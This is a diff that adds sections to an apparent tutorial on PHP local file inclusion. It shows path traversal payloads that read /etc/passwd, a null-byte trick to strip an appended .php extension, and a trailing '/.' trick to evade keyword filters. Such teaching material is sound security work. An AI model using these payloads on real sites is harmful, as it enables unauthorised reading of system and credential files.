@@ -36,3 +36,23 @@ That is possible because the `include` function has no validation.
 
 The directory is given but if there is no input validation, we can `path traversal` with the following payload  
 `http://homepage/index.php?lang=../../../../etc/passwd`
+
+## Null byte
+
+```php
+Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/website/index.php on line 12
+```
+
+We could move outside the php directory but still, the include function reads reads the input with `.php` at the end. This is because the developer specified the file type.  
+With a NULL BYTE we can bypass this: `%00` or hex `0x00`
+Everthing behing this is beeing ignored. 
+
+**NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.**
+
+## Keyword filter
+
+```shell
+website/index.php?file=../../../../etc/passwd/.
+```
+
+The last `/.` is qual to a simple `cd` so you stay in the same directory
